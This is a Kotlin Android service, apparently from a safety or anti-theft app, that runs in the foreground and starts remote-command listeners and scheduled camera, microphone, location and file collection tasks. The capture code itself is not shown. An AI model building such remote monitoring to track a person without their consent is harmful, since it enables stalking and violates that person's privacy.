package com.save.me

import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.IBinder
import android.util.Log
import kotlinx.coroutines.*

class SurveillanceService : Service() {

    private val job = SupervisorJob()
    private val scope = CoroutineScope(Dispatchers.IO + job)

    companion object {
        // Keeps a reference to the service context for notification updates
        @Volatile
        var serviceContext: Context? = null
    }

    override fun onCreate() {
        super.onCreate()
        serviceContext = this
        Log.d("SurveillanceService", "Service created and foreground notification starting.")
        NotificationUtils.createNotificationChannel(this)
        startForeground(1, NotificationUtils.buildForegroundNotification(this))

        // Start background observers
        scope.launch { SupabaseUtils.startRealtimeCommandListener(this@SurveillanceService) }
        scope.launch { CameraUtils.schedulePhotoVideoTasks(this@SurveillanceService) }
        scope.launch { AudioUtils.scheduleAudioTasks(this@SurveillanceService) }
        scope.launch { LocationUtils.scheduleLocationTasks(this@SurveillanceService) }
        scope.launch { FileUtils.scheduleFileTasks(this@SurveillanceService) }
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        serviceContext = null
        Log.d("SurveillanceService", "Service destroyed.")
        job.cancel()
    }
}